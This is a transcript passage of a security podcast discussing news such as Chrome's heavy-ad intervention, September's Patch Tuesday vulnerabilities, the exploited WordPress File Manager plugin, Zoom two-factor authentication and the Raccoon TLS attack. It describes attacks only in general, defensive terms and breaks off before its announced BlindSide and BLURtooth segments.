We've also got last Tuesday's what you'd have to call in retrospect, looking over what happened, a Patch-a-Palooza, which we'll discuss.  We've got Zoom's new implementation of two-factor authentication, a follow-up on that very bad WordPress File Manager attack, now two weeks old, and there's been some updates.  We've also got, as I mentioned, a new, it's called the Raccoon attack, against TLS.  Also a quick SpinRite update to sort of keep our listeners current with what's going on there.  And then we'll conclude with a deeper look at two newly discovered attacks named BlindSide and BLURtooth.  So I think another fun...



LEO:  Sounds like a CBS cop show.



STEVE:  Another fun couple hours for our listeners.



LEO:  BlindSide and BLURtooth.  It should be fun.  On we go.  Do you have a picture?  Oh, yes, you do.



STEVE:  Oh, yes, I do.



LEO:  Oh, yes, we do.



STEVE:  This came up a couple weeks ago on Firefox, and I hadn't ever seen it before, so I thought that was interesting.  It was a message when I tried to go - actually, I went to www.coolmagnetman.com.



LEO:  Okay, good.  Yeah, magnets are cool, I agree, yeah.



STEVE:  Magnets are neat, yeah.  And I got an error:  SSL_ERROR_UNSUPPORTED_VERSION.  And it said:  "The page you're trying to view cannot be shown because the authenticity of the received data could not be verified.  Please contact the website owners to inform them of this problem."  And then it said, under Learn More:  "This website might not support the TLS 1.2 protocol, which is the minimum version supported by Firefox.  Enabling TLS 1.0 and TLS 1.1 might allow this connection to succeed."



LEO:  So it's a really old server.



STEVE:  Yeah, exactly.



LEO:  Using a deprecated protocol.



STEVE:  Well, I mean, things have been moving along, and Cool Magnet Man may be not very into his...



LEO:  He's got other things, yeah, other things to do.



STEVE:  He's got other things, yeah.  He's trying to figure out, wait, is this the North Pole or the South Pole?  He's not sure.  Anyway, so then it finishes, just like get ready:  "TLS 1.0 and 1.1 will be permanently disabled in a future release."  



LEO:  But we knew that; right?  I mean...



STEVE:  Yeah.  Yeah, yeah, yeah.



LEO:  I'm surprised that there's this escape valve.  It's kind of in between; right?



STEVE:  Again, you know, we always see this.  And we were sort of talking about this relative to the iframes last week, and sandboxing.  As we're moving forward, we're often sometimes just leaving old stuff behind, or regretting some of the earlier decisions that were made.  And you could argue that maybe the web wouldn't have happened unless things had been as completely crazy and wide open and anything goes as it was back then.



LEO:  Well, it's not like TLS 1.0 or 1.1 was bad then; right?



STEVE:  No, they're just fine.



LEO:  It's not broken.  It's just weak.



STEVE:  Right, exactly.  It's a little bit like the Spectre and Meltdown things where it's like, oh, you know, those pesky academics, they wrote a paper or two and said, oh, look, if you are facing the South Pole when you touch your nose and spin around three times, maybe you could decrypt this connection if you were lucky, and that kind of thing.  So it's like, okay, again, makes sense to be moving forward.  We're at 1.3 is the latest one.  One of my servers actually is stuck at 1.2 because of course Microsoft doesn't want to - they want to force me to move to some Windows 10 server, which is like, ho ho ho, we'll see about that.  Anyway, Mark Thompson tells me it's not so bad.  Okay, well...



LEO:  Is he trying to talk you down?  Hey, I got this thing, Cool Magnet Man is...



STEVE:  Oh, god.  I said to Mark, if they're done this to Windows 10, what have they done to Windows 10 Server?



LEO:  By the way, CoolMagnetMan is still - see, the problem here, so there's kind of three layers.  You could be supporting 1.3.  You could be supporting 1.0, 1.1, and 1.2 and 1.3.



STEVE:  As I am, for example.  GRC still supports the down versions.



LEO:  A lot of sites do that.  Right.  And they don't want you to do that.  But this is worse.  He's not even supporting 1.2.  He's not...



STEVE:  Correct.



LEO:  Yeah.  He's, like, really old.



STEVE:  Correct.  It's interesting, too, because I was looking at this picture.  I went over there and looked at his certificate.  And his certificate says "not valid before August 4th of 2020."  Which means that he did a cert renewal like last month, probably because that was happening.  And as with all newly issued certs, it's only a one-year certificate.  So anyway, I would imagine maybe he'll see his traffic fall off because some people are going to go, ooh, warning message, danger, danger.  And it's like, okay, well, it's actually fine.



LEO:  Should I not enable TLS 1.0 or 1.1?  Is that risky to do?  You know, they have that button.  I could enable it.



STEVE:  Yeah.  I pushed it because I went there, and I did not get the error message again.



LEO:  I don't think he's updated this site in a while.  Nice use of Microsoft WordArt.



STEVE:  Now, Leo, it looks very much like GRC.  So be kind.



LEO:  No, no, no.  You don't have any WordArt on GRC.



STEVE:  Once upon a time.  But no, yeah.



LEO:  I'm surprised these letters don't rotate.  I think Magnet Man's really missing a bet here.  They could be going back and forth.



STEVE:  Oh, Leo, I'm sure that his Send Me Mail mailbox is spinning around somewhere.



LEO:  Oh, I'm sure that's animated, yeah.  No, we're not - we're just teasing you, Cool Magnet Man.



STEVE:  We're just showing our age is what we're doing.



LEO:  Yeah, we recognize this site, yeah.



STEVE:  Yeah, it seems familiar.  So Chrome, fortunately, will be getting tough on abusive ads.  In a posting on GitHub, Google's engineer John Delaney has spelled out the Chromium Project's intentions regarding abusive ads.  So first of all, modern web pages are a jungle of stuff.  So how does Chromium, the Chromium engine, determine for itself what's an ad and what isn't?  It comes down to something known as "ad tagging."  Chromium is able to detect some ads and the resources they load in the browser.  This enables the browser to measure the size, the performance, and the count of ads displayed to its users.  It also allows the browser to intervene on the user's behalf when ads run counter to what they decide is the user's interest, for example, using a crazy amount of resources, engaging in some abusive behavior or whatever.



So the ad detection infrastructure they call "ad tagging."  And it's not very inspired.  It works by matching resource requests against a filter list to determine if they're ad requests.  And in a sample that they've got of some code, they show them importing the EasyList, which of course is a well-known list that's being maintained by a community of known domain names that are providing ads.  So they said:  "Any requests matching the filter are tagged as ads.  Further, requests, and some DOM elements such as iframes, made on behalf of previously tagged scripts, are also tagged as ads by the ad tracker."  So it's not just images that match the filter, it's if scripts were coming from a known ad source, then things that are essentially descendants of those scripts would also be tagged as ads, which certainly you would want to have happen.



They said:  "An iframe will be marked as an ad iframe if its URL matches the filter list, if tagged script is involved in the creation of the iframe, or if its parent frame is an ad iframe."  So, you know, you can't sneak out of it by creating a frame within a frame and saying, oh, look, I'm not the original one.  "The main frame on a page will never be tagged as an ad."  Good.  And then they said:  "Any request made within an ad iframe is considered an ad resource request."  So drilling down on this one level, we learn that the subresource filter loads the filter list and then performs this URL matching of any requests against that list.  It's distributed, that is, the filter list is distributed via the component updater, which is just part of the Chrome installation.  So it's being kept current constantly.



And the same list and component is also used for blocking ads on abusive sites and those that violate the better ads standard.  They explain that each subresource request in the render process is processed by the subresource filter before the request is sent from the browser out.  So it's not that it blocks things coming back.  It never makes the request in the first place.  It just denies it from the page making the request.



Okay.  So you get ads identified as such.  How are they treated differently?  And this is where John explains what they call the "Heavy Ad Intervention.  A small fraction of ads on the web use" - and John likes the word "egregious."  We'll see this a couple times - "an egregious amount of system resources."  He says:  "These poorly performant ads, whether intentional or not, harm the user's browsing experience by making pages slow, draining the device's battery, and consuming mobile data," he says, "for those without unlimited plans."



And then he says:  "In these egregious cases, the browser can unload the offending ads to protect the individual's device resources."  He says:  "This is a strong intervention that's meant to safeguard the user's resources with low risk because unloading an ad is unlikely to result in loss of functionality of the page's main content."  He says:  "Examples of observed ad behavior that are intended to be discouraged are" - no surprise - "ads that mine cryptocurrency; ads that load large, poorly compressed images," so just sloppy ads; "ads that load large video files before a user gesture; or ads that perform expensive operations in JavaScript, such as decoding video files or performing CPU timing attacks."  Yeah, we don't want those.



So Google notes that it's not their intention to discourage any specific ad creative formats such as display video ads.  So they're trying to be as agnostic as possible.  So the user agent, the browser, will unload ads that use, and he says again, "an egregious amount of network bandwidth or CPU usage.  We define 'egregious' as using more of a resource than 99.9% of ads as measured by the browser."  So it sets a very high bar.  And he says:  "Only ads that have not been interacted with by the user will be unloaded."



And here's what's interesting, and this is some tech we've never talked about before that's therefore worth mentioning.  All unloaded frames will be notified via an intervention report that the intervention occurred.  This feedback is necessary to help advertisers or their ad technology vendors to identify and fix ads that are triggering this intervention.  So first of all, just a little last word on the classification of ads.  He says that's left to the discretion of the user agent.  For example, Chrome detects ads using what we talked about, the ad tagging feature.



An advertisement is considered "heavy" if it has not been clicked on by the user and meets any of the following criteria:  It uses the main thread for more than 60 seconds total; or used the main thread for more than 15 seconds in any 30-second window, so they said in parens "(50% utilization over 30 seconds)"; or used more than 4MB of network bandwidth to load resources.  So any of those thresholds get crossed, the new Chrome technology will say nope and just boot the ad.  Sorry, you're a bad ad.  And he said that the thresholds above were inspired by the IAB's Lean Standard, that's in caps,  but is chosen by looking at Chrome's metrics at the 99.9th percentile of network and CPU usage in ads.



So again, most ads are not going to cross that line.  But those that do, and there are some, bye-bye.  He said the threshold numbers were then rounded to be readable and memorable, thus 60 seconds instead of whatever it actually was, or 15 seconds in any 30-second window, and 4MB.  Numbers were picked inclusive of all ads seen by Chrome's ad tagging, which is better at capturing display ads than native ads. 



Okay.  So when these interventions were put in place, they wrote that intervening at those thresholds saves 12.8% of the network usage by ad creatives and 16.1% of all CPU usage by ad creatives, with most of that value going to individual users, meaning individual sources.  So that's interesting.  That means that despite setting the bar that high, so that it is at the 99.9th percentile, it creates a savings of 12.8% in network usage and 16.1 percent across the board in CPU usage, which suggests that what is actually happening is a very small percentage of ads is trying to use a really obscene, I mean, I'll use that word rather than "egregious," an obscene amount of network and CPU.  So this seems like a really good thing to do.  You put the bar really high, and you say to a very small percentage of really extremely misbehaving ads,  "Bad.  We're kicking you out.  You can't do this anymore."



So this one concept we had never talked about, the so-called "intervention report," is a very cool extension of the web API which essentially allows closing the loop.  Modern web browsers support what's known as the "reporting API," which allows them to send back asynchronous event reports to a resources sourcing server, or at least the server that they have said they would like to have receive those reports.  So as we know, a web page or code on a web page will make a query to a remote web server for content.  And that content might be an advertisement.



One of the headers in that remote web server's reply can be "Report-To:."  Its corresponding string value is a JSON formatted string which contains a URL and an "expires" tag, to which reports of any subsequent issues with that resource can be sent at any later time subject to the recipient's requested expiration.  So, for example, if JavaScript were to crash which had been received from that source, a report can be sent back to the source saying, hey, your JavaScript crashed.  Or in this case, if an ad has misbehaved such that it has been unloaded from the browser, Chromium-based browsers will, if there is a Report-To: header that accompanied the ad, will play nice and say, hey, thought you should know this ad has been booted.  So you ought to consider maybe doing something different, like compressing the imagine or shortening the video or stop trying to mine cryptocurrency or whatever.



So anyway, just a very cool sort of next step in the evolution of the 'Net.  One of the things that's nice about the way the 'Net works is because it is this relatively clean query and reply, or request-and-reply structure, it is simple to - carefully, they don't want to overdo it - but to carefully add additional high-value features which can further mature the web side of the Internet.  And this is certainly one of those.



There is a fun way for our users to play with this stuff, for anyone who has Chrome 84 or later, which should be everybody because we're all at 85 now.  There are a couple flags which are not yet enabled by default.  Google will be, you know, this is like their statement of what we intend to do.  But the tech already exists since Chrome 84.  If you go to chrome: in the URL bar, chrome://flags/ and then #enable-heavy-ad-interventions, you can turn this on.  And then also there's another one in there, #heavy-ad-privacy-mitigations, and that one is also hyphenated.



Setting the Chrome flags enable-heavy-ad-intervention will activate this behavior.  But they recognized that because behavior could be probed by somebody deliberately trying to figure out where the triggers were, and that could also be a privacy problem, that the so-called "privacy mitigations" deliberately add some fuzz to the thresholds.  So if you want to turn that off, you can turn that off.



Shoot, and there was another, I had another piece of this that didn't make it into the show notes because there's a site you can go to that deliberately misbehaves and so you can see this all happening, but I forgot to transcribe it into the show notes.  So I will provide it next week in the errata.  I meant to do that because it was a place you could turn this stuff on and then go there; and it was like, as I said, a deliberately misbehaving site that was kind of cool. 



So, nice that our browsers are getting that.  I thought it was really interesting that setting the bar that high created that large a savings for the typical user.  So there are very few bad actors; but, boy, they are really bad.  And now they're going to get caught and told, sorry, you don't get to do that anymore.



Malwarebytes Labs has issued a warning about their observation of a sudden large surge in attempted malware attacks leveraging oldie-but-goodie vulnerabilities in IE - yeah, IE - and Adobe Flash.  These attacks are being observed on sites featuring, shall we say, highly explicit adult sexual content.  One of the vulnerabilities from last year was CVE-2019-0752.  Its description says this vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Microsoft Internet Explorer.  User interaction is required to exploit this vulnerability, and that the target must visit a malicious page or open a malicious file.



Okay, well, visiting a page sets a low bar of user interaction.  It's not like you have to do anything once you get there.  The specific flaw exists within the handling of script commands that set certain properties of DOM (Document Object Model) objects.  By performing actions in script, an attacker can trigger a type confusion condition.  An attacker can leverage this vulnerability to execute code in the context of the current process.



Now, we talked about this at the time, a year ago - actually I think it was like a year and a half ago - and urged people to fix it.  We talked about workarounds.  There was one of those little 0patch quickie fixes.  The point is that there are still IE instances that have not been updated.  And for anyone unlucky enough to visit one of these infected websites with an unpatched version of IE, one of two well-known exploit kits will be downloaded and executed on that unfortunate visitor's machine.  And if that one doesn't get you, the site will also try to leverage an even older flaw from 2018 that existed in Adobe's still not quite dead yet, you know, after all it's just a flesh wound, Flash Player.



Malwarebytes notified the industry about a malware malvertising campaign which is now in full swing.  And the trouble is that a surprising number of people, hopefully none listening to this podcast, are still venturing out into the world, pushing a copy of IE ahead of them, and using that as their interface to the web.  And as we know, it's just no longer up to the job.  The group behind the attacks is a group named Malsmoke.  They've operated on a scale far above other similar cybercrime operations and have, according to Malwarebytes, who's been tracking Malsmoke's attacks, abused practically all adult ad networks.



Most of the time, the group has managed to place malicious ads, as we call them, "malverts," only on mid-tier adult portals.  But they recently "hit the jackpot," as Malwarebytes put it, when they managed to sneak malverts on xHamster, which - and this was news to me - is one of the biggest adult video portals in existence, and one of the biggest sites on the Internet.



LEO:  I don't even want to ask what they post on xHamster.



STEVE:  Exactly.  Billions of visitors each month, Leo, to xHamster.



LEO:  For people who love rodents, I guess.  Okay.



STEVE:  Ah, yeah.  I would suggest no one go there, whatever that is, and certainly not with IE.  But again, as I said, there's no way any of the listeners of this podcast are, like, choosing IE.  You have to deliberately just want to go get hurt to use IE at this point.  Although we also know, sadly, there are enterprise users who apparently still haven't moved.  Or maybe at this point they are unable, for whatever reason, to move themselves away from IE because of vertical software which was written to it back in the day, and they're still having to use it.



There was also some news that flashed by me noting that Microsoft was going to begin pushing their Chromium-based Edge onto people's Win10 machines, whether they asked for it or not.  At this point it's still been sort of an optional, hey, we've got a new Edge.  It's better.  Get it.  So I would suggest that everyone should have asked for it long ago because it is better.  There's just no downside unless some, again, misguided enterprise wrote custom code that only runs on the original Edge.  And that one wasn't bad, but Microsoft has abandoned it.  So everybody else needs to also.  And in that case it's time to fix any software that an enterprise may have that only runs there.



So I really have no problem with having everyone moving over to a Chromium-based engine.  That would be a good thing.  And Edge has ported a new feature which they originally had in classic Edge over to the new Chromium-based Microsoft Edge.  And that is there are some additional features available when you download a file.  You need to enable it by going to edge://settings/downloads.  You'll get a screen with almost nothing on it, which is refreshing, except an "Ask me what to do with each download," which you should turn on.



The reason is, as I had mentioned recently, with script being able to trigger downloads, you don't want those to be able to be dropped on your machine into the default download location without some sort of explicit involvement.  Script can do it.  But if you say,  "Ask me what to do with each download," you'll get a big dialog saying where should it go?  And just it's fine if you accept the default, click OK.  But at least that way you're assured of being involved.



So anyway, the cool thing is that in the Chromium Edge, they're adding - and I had never noticed before, in the pop-up for options on the newly downloaded file there will be a "Copy download" link which could come in handy, and a "Delete," which is also nice.  You don't have to go find it and then delete it if for some reason you downloaded it twice or three times or whatever.  It's right there on the pop-up.  It's like, no, don't need it after all, delete.  So those are available, but only if you enable them at the moment with this "Ask me what to do with each download."  That turns those additional context menu options on, which seems like a useful thing to me, especially because you want to be involved in downloads.



So we are the week after Patch Tuesday.  It's the latest one that can happen because the month started on a Tuesday.  And this was a big one.  September, this month, saw 129 vulnerabilities patched.  And some of those in the industry have admonished, try to be kind to your Windows admins, who will be scrambling to juggle the impact of last Tuesday's 23 critical vulnerabilities while working to resolve the bugs caused by patching them.  This month's was not the all-time greatest patch month, but it did tie with this past June's 129 record-breaker.  So now we have two months that are both - they now share the record of 129 vulnerabilities patched in a single month.



Microsoft provided patches to repair 23 critical flaws, as I said, in Windows and its related products; 105 important flaws; and one lone moderate vulnerability.  While there were fortunately no zero-days that were known to be under exploitation, there were quite a few interesting vulnerabilities that could be remotely exploited for the enterprise, and of serious concern was CVE-2020-16875.  That would likely grab the attention of any admin, being a memory corruption vulnerability in Exchange that can allow a remote attacker to perform remote code execution as the system account, meaning root, merely by sending a specially crafted email to an Exchange server.



So Dustin Childs, who's a researcher at Trend Micro's ZDI, their Zero-Day Initiative, wrote in his analysis last Tuesday:  "That is about the worst-case scenario for Exchange servers."  He said:  "We've seen the previously patched Exchange bug CVE-2020-0688 used in the wild, and that requires authentication."  This one doesn't.  He says:  "We'll likely see this one in the wild soon.  This should be your top priority."  And as we know, the danger, now that this has been patched, is that clever bad guys - and they are, I tip my hat to them, very clever - will examine the fix, then design and launch attacks before the Exchange admins can get their systems updated.  So don't dally on this one, anybody who's in charge of Exchange server.  It's been a week.  Hopefully this is old news to everyone.



Another critical remote code execution vulnerability that should be prioritized for patching is 2020-1210.  That one exists in SharePoint due to a failure to check an application package's source markup.  It rates a 9.9 out of 10.  I don't know, have we seen a 10?  Anyway, it's as bad as any that we see on the severity scale.  Satnam Narang, a staff research engineer at  Tenable, wrote, he said:  "To exploit this flaw, an attacker would need to be able to upload a SharePoint application package to a vulnerability SharePoint site.  This vulnerability is reminiscent of a similar SharePoint remote execution flaw.  That one was 2019-0604 that has been exploited in the wild by threat actors at least since April of 2019."  In other words, bad guys really are getting on these, like immediately.  It's a way in.



So this month there are a total of seven remote code execution bugs being fixed in SharePoint; and only one of them, 2020-1460, requires authentication.  In other words, the other six don't.  So yes, again, we see that patched vulnerabilities are irresistible to attackers who know that they will almost certainly find some laggards at high-value targets.  So they're going to reverse engineer them.  They're going to figure out how to exploit them.  And then they're going to start looking for, in some cases Exchange, in this case SharePoint servers, and then have at it.



Justin Knapp, the product marketing manager at Automox, pointed to another critical remote-code execution vulnerability.  This one has an 8.4, which was just fixed in Windows Graphic Device Interface, the GDI.  That one's 2020-1285.  And this one arises because of the way GDI handles objects in memory, providing both web-based and file-sharing attack scenarios that could introduce multiple vectors for an attacker to gain control of a system.  In the web-based attack scenario, an attacker would merely need to craft a website designed to exploit the vulnerability, or of course post an ad somewhere on a heavily visited site.  And that would cause the browser to render the ad.  So users who viewed the website would get hit.  Not a high bar on that one.



And we also have 2020-1129, another remote code execution flaw in Microsoft Windows Codecs Library, with an 8.8 severity score.  As we know, state-of-the-art codecs are quite difficult to make perfect, yet perfect they must be.  Any program that can cause Microsoft's HEVC codec to be invoked can be used to exploit this entry.  An attacker could execute code on a victim machine by convincing someone to view a weaponized video clip.  The flaw exists within the parsing of HEVC streams such that a crafted HEVC video file can trigger an overflow of a fixed-length, stack-based buffer.  We've talked about this sort of problem in much detail in the past, so I won't go into it any further.



But, I mean, again, I said there were just lots of goodies - bad, bad problems that were fixed two weeks ago.  There's also 2020-0922 which describes itself as a Microsoft COM for Windows Remote Code Execution Vulnerability that can be exploited by luring a visitor to a site with malicious JavaScript.  So JavaScript running on a site could take advantage of it, if somebody figures out how to reverse engineer and weaponize that.  So best not to find out.  I'm sure by now all of our listeners have got their Windows 10 machines updated.



And I'll just finish with 2020-0908, a Windows Text Service Module Remote Code Execution Vulnerability that can be exploited by tricking a user to visit a site that contains malicious user-provided content or ads.  Well, that's very generic sounding.  People who looked at it were quite worried about its potential for exploitation.  So oftentimes, again, they were not zero-days at the time of their release.  Technically they can then never become zero-days, but they can certainly become one- or two- or three- or four-days.  And users who haven't updated will be vulnerable to them until they do.



So, you know, it's tricky because we have been also, all year, we've been talking about updates causing problems for users who didn't have problems before.  At the same time, they are now closing really bad and exploitable vulnerabilities.  So I guess the best advice is, because they tend to be edge-case problems when they occur, you're probably better off updating; and, if something breaks, then quickly back yourself out of that so that you're not going to have that problem.  So you tried to update if you could; but if something critical broke on your system, then you're just going to have to wait for Microsoft to fix that.



So speaking of eating away at things, remember that something broke in Windows some time ago that was causing it to forget that it had ever defragged its mass storage drives.  So it was doing so needlessly and, in the case of SSDs, inducing unnecessary wear.  Every time the system booted, it thought it had never defragged again.  The idea is that it performs an initial defrag the first time Windows is rebooted after installation.  And then I think it's, what, monthly it does it, but not every time.  And it was also issuing trim commands, which only make any sense and are only supported by SSDs.  It was sending trim commands to your spinning hard drives that were saying, uh, what?  Trim what?



LEO:  Oh, that's funny.  Oh, that's hysterical.



STEVE:  Yeah, crazy.  It's like, come on, Microsoft.  Anyway, half of this was fixed last Tuesday, that is to say the excessive defragging of SSDs.  Anyone who might have manually disabled the automatic maintenance of their SSDs in the interim to suppress this unnecessary wear - and I would think it's not that much wear, but still I know there are people who are like, oh, I don't want any writing that I don't have to have.  If anyone did that, you can turn it back on because after last Tuesday's updates it now remembers that it had defragged it before.  However, the mis-issued trim commands are still being sent to spinning hard drives.  But it's not a critical problem.  It simply fails and posts a note to the system's error log that for some reason your hard drive has rejected the trim command.  It's like, uh-huh, yeah, it's supposed to because it doesn't know what to trim.



Last week we first covered this very bad problem in the very widely used WordPress File Manager.  Remember that the problem was that files that were meant for development and were supposed to be renamed or have a name that would keep them from being active, had by mistake been left as a .php in several distributions.  And as a consequence, many hundreds of thousands of installations of WordPress that had those versions of File Manager were trivially exploitable.  And what we're learning is that it is the triviality of the exploit, it is how low is the hanging fruit that determines how rapidly and how widespread the script kiddies will jump onto this.



So I started off talking about it last week, saying it's not good when a zero-day flaw is discovered being actively exploited in an extremely popular plugin for WordPress.  And it's also somewhat jarring that we keep covering exactly such news.  So here we are again, revisiting it one week after last week's report, which is two weeks after the start of this drama because it began at the beginning of the month, on Tuesday, September 1st.  Researchers at the WordPress security firm Defiant spotted more than 1.7 million WordPress sites being probed by bad guys, right off the bat, between September 1st and 3rd.  That's what we reported last week.



In their updated report that was published as we were talking about it last week, last Thursday the 10th, their threat analyst, Ram Gall, wrote that the attackers have not stopped their siege.  Anything but, in fact.  Now the number of WordPress sites being targeted has jumped to 2.6 million.  Multiple groups of bad guys are known to be targeting this File Manager vulnerability, though Defiant has noted that there are a particular two from among the many who have seen the most success in deploying their malware.  And one reason is they're taking the time to close the backdoor to the site after they've entered.



One of the two is an attacker known as Bajatax.  He's based out of Morocco.  He's known for stealing user credentials from specific ecommerce websites.  And in this instance, once the attacker compromises a WordPress site, he injects malicious code that harvests and exfiltrates user credentials via Telegram on any subsequent normal front door login to the site.  And then those credentials are sold to the highest bidder on the dark web.



The second attacker has been observed to inject a pair of backdoors onto compromised WordPress sites, compromised by having this vulnerable version of File Manager.  One of those backdoors is put into a randomized folder name and another onto the site's web root.  Both are camouflaged as .ico, to look like icon files, to reduce the likelihood that the site's admin will find either or both of them and thus curtail the attacker's subsequent access to the site.  And as we've long said, once a server, a site, or a machine has been compromised, it can never fully be trusted again.



The PHP infector that's being used by the second attacker is a variant of an infection that's been previously used to deploy cryptominers and to run SEO spam campaigns against compromised sites.  And Defiant, the WordPress security firm, has observed both of these attackers working to block, as I mentioned, other attackers' exploit attempts by password-protecting that exploitable, it's connector.minimal.php file - actually, I think it's connector-minimal.php - on the sites once they have infected those.  Defiant's people said that their site cleaning team had cleaned a number of sites compromised by this File Manager vulnerability, and in many cases discovered malware placed there by multiple attackers, obviously by attackers who did not think to close the door behind them after they had entered.  But thanks to those first two being proactive about blocking others and collectively employing several thousand IP addresses in their attacks, those two have been the most successful.



And somewhat amazingly, overall, Defiant's researchers have monitored attacks attempting to exploit this vulnerability originating from more than 370,000 separate IP addresses.  So they're exploiting proxies that they've been able to compromise, or maybe botnets, which are deployed and are ready and able to launch attacks under control.  But attacks are coming from everywhere.  And at this point, two weeks downstream, it's probably safe to say any WordPress site that was using a vulnerable version of this File Manager add-in that didn't immediately update it now has malware running on it.  And maybe it's peacefully coexisting.  We don't know what the malicious guys are doing.



We know that in one case the valid login credentials are being harvested.  So as soon as the legitimate owner of the site logs in, if you have been compromised by the first of those two, the Bajatax guy, then your valid login credentials and the site you're logging into are sent off via Telegram.  So they're encrypted and received by the attacker, who then puts them up for sale on the dark web for anybody else who wants to log in as the valid user.



So again, if you find that your site is compromised, you just sort of have to flush it.  Unfortunately, maybe you back up your content.  You just destroy the site.  You don't reuse your previous credentials, obviously.  And then build a new site from scratch and then reload the content, that is, the textual content, not files that have been - don't just restore the whole site or you could be restoring the malware, too.  It's a mess.



Zoom, that we've been talking about ever since it became the talk of the town thanks to COVID-19 and the coronavirus, now is offering two-factor authentication, which I think is just all for the best.  Last Thursday, the 10th, Zoom announced the availability of several forms of second-factor authentication - traditional time-based token, standard two-factor authentication, or via SMS, or a phone call for logging into Zoom.



I have a note, I'm sorry, a link to all of the details, but I'll just quickly explain that they said log into the Zoom dashboard.  You navigate to the Advanced, then the Security feature.  And then you will find a new sign-in with two-factor authentication option.  You enable that, and then you've got three options for how pervasive to require two-factor authentication.  You can choose to require it for all users of the account; for only users with specified roles, and if you choose that option then you choose which roles will be required to use two-factor authentication; or you can enable it for users that are in specific groups and then choose which groups you want to have to require two-factor authentication.  And then as always with a web form, save the changes that you've made to make them permanent.



So anyway, I think that's just a nice move forward for Zoom, which is continuing to be very popular.  And to prevent the problem of an easy username and password hack, as we know, a second factor makes sense.  People could still not understand how important it is to have really strong passwords, be using a simple password, and then be subject to a brute-force login attempt.



Okay.  The one that didn't make the cut for being one of the title interventions is Raccoon.  One headline read "New Raccoon Attack Could Let Attackers Break SSL/TLS Encryption."  But a more sober headline in the tech press covering this said "Raccoon attack allows hackers to break TLS encryption under certain conditions."  And then their subhead further noted:  "The Raccoon attack is described as 'really hard to exploit' and its conditions as 'rare.'"



So anyway, as I said, when I was gathering stuff together, I initially thought I would include this in the headline, but no.  What the researchers found was an attack which no longer works in TLS 1.3, for one thing.  So it's 1.2 or earlier.  It is a very subtle edge-case timing-related attack in the instances that ephemeral Diffie-Hellman key exchange is used to set up the premaster secret in a TLS connection.  And for anyone for whom those terms are not known, we have done a number of podcasts in the past where we talked all about how secure connections are set up.  At the time it was probably over TLS 2.0, so it's a ways back.  But all of the terminology and techniques are the same.



So these guys wrote:  "Diffie-Hellman key exchange is a widely adopted method for exchanging cryptographic key material in real-world protocols such as TLS-DHE.  Past attacks on TLS-DHE focused on weak parameter choices or missing parameter validation."  So that would be implementation scale sorts of problems.  He said:  "The confidentiality of the computed Diffie-Hellman share, the premaster secret, was never questioned.  DHKE (Diffie-Hellman Key Agreement) is used as a generic method to avoid the security pitfalls inherent in TLS-RSA."



They said:  "We show that, due to a subtle issue in the key derivation of all TLS-DHE cipher suites in versions up to [and including]" - I added the "including" because they didn't make that clear - "TLS 1.2, the premaster secret of a TLS-DHE session may, under certain circumstances, be leaked" - that's not good - "to an adversary.  Our main result is a novel side-channel attack, named Raccoon attack, which exploits a timing vulnerability in TLS-DHE, leaking the most significant bits of the shared Diffie-Hellman secret."



Anyway, I'm going to skip the rest of their discussion because it doesn't matter.  Which is why it's also not in the title of this podcast.  It requires an obscure modulus to be used for the Diffie-Hellman key agreement handshake.  It also requires that the attacker be immediately adjacent to one of the endpoints in order to have any chance of having sufficiently accurate timing on the handshakes.  It is a side-channel attack because it involves timing.



Even the researchers were quoted saying:  "The vulnerability is really hard to exploit" - that's their words - "and relies on very precise timing measurements and on a specific server configuration to be exploitable.  The attacker needs to be close to the target server" - this is them still speaking - "to perform high-precision timing measurements.  The victim connection needs to use ephemeral Diffie-Hellman, and the server also needs to reuse ephemeral keys.  And, finally, the attacker needs to observe the original connection."



In other words, it's useful research, but it's nothing for us to worry about in the real world.  If you see headlines or mentions of this, just flip to the next one because, fine.  But all that said, we know that attacks only ever get better, as Bruce Schneier famously said.  Maybe this could.  And we're going to be talking about exactly things getting harder or better when we get to the title meat of this podcast.  So Microsoft, Mozilla, OpenSSL, and F5 Networks have all recently released security updates to block Raccoon attacks.



So as I said, it made a change.  Things are better now.  Useful academic research.  But it would have been very difficult at this stage of its development for this to actually affect anybody.  And while I'm on the subject, by the way, don't google "raccoon attack" for additional information.  Turns out those little guys are much scarier than the actual digital attack that bears their name.  I did google "raccoon attack," and whoo.



LEO:  Did you find Kevin Rose?  Did you see his raccoon battle?



STEVE:  No.



LEO:  Oh, I'm surprised.  Google "Kevin Rose raccoon attack."



STEVE:  Uh-oh.



LEO:  He and his dog, Toaster, got in a bit of a fracas some years ago.  Here, I'll just play the 47-second video of it from ABC News.



STEVE:  Wow.



LEO:  This was some years ago.  "Man saves dog from raccoon attack:  At 1:00 a.m. I heard my dog Toaster crying and yelping in pain.  I discovered a raccoon attacking him.  I do not encourage" - Kevin is a very sweet, gentle person.  So he says:  "I do not encourage animal violence.  I wanted to get the wild animal as far away as possible.  Toaster is okay."  So there's Toaster and the raccoon battling it out.  And here comes Kevin Rose, superhero.  He picks up the raccoon by the tail and throws it.  Toaster escapes unscathed.  Kevin chases the raccoon off into the night.



STEVE:  Yeah, he really did fling it.



LEO:  You want another shot?



STEVE:  I'm glad the raccoon was able to continue moving.



LEO:  Apparently he says the raccoon - this is so funny.  He says the raccoon wandered off unscathed after it.  But I'm not surprised.  Here's another angle.  Whoa.



STEVE:  Whoa.  What a little adrenalin will do for you.



LEO:  We've been mocking Kevin ever since.  That was 2015, I think, five years ago.  2013.



STEVE:  I'm glad he saved Toaster.



LEO:  He saved Toaster.



STEVE:  Glad he saved Toaster.



LEO:  The only dog I know that has an Instagram filter named after him.



STEVE:  One last bit, a quick update on SpinRite.  I am proud to say that I'm down to very few, but not quite zero, remaining edge cases with the mass storage benchmark that are occurring on a few very specific pieces of hardware.  I briefly put that journey on hold because I wanted to actually finish getting GRC's new web forums ready to go so they would be ready as soon as the code was.  So I spent some time over the weekend working to finish bringing them up.  The last thing that needed finalizing is to get SQRL logon working for that domain.  Turns out it was a little tricky.



When I wrote GRC's server-side support for SQRL, I made it flexible enough to handle any one domain.  But I did not build in support for multiple simultaneous domains.  Sqrl.grc.com and forums.grc.com are separate authentication domains as far as SQRL is concerned because anyone using SQRL is asked to confirm the domain they're logging into, so it should appear as sqrl.grc.com for the SQRL forums and forums.grc.com for the GRC forums.  So anyway, I added support to GRC's server-side implementation to handle any number of explicit subdomains of a parent domain, so we have that capability now.



